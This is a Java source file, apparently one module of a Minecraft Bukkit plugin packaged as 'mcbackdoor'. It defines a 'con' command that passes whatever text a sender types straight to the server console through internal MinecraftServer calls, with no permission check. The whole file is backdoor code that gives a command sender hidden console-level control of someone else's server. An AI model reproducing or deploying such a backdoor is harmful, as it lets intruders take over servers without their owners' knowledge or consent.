/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.scmd.modules;

import net.minecraft.server.MinecraftServer;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.hacks.get_mc_server;
import org.martin.bukkit.mcbackdoor.scmd.Module;

/**
 *
 * @author martin
 */
public class ConsoleModule implements Module {

    private MinecraftServer mcServer;
    private JavaPlugin plugin;

    public void enable() {
    }

    public void disable() {
    }

    public void setPlugin(JavaPlugin pl) {
        plugin = pl;
    }

    public boolean onCommand(CommandSender sender, String[] args, String unclean) {
        if (mcServer == null) {
            mcServer = get_mc_server.getMCServer(plugin);
        }
        if (!mcServer.g && MinecraftServer.a(mcServer)) {
            mcServer.a(unclean, mcServer);
        }
        return true;
    }

    public String getCMD() {
        return "con";
    }
}
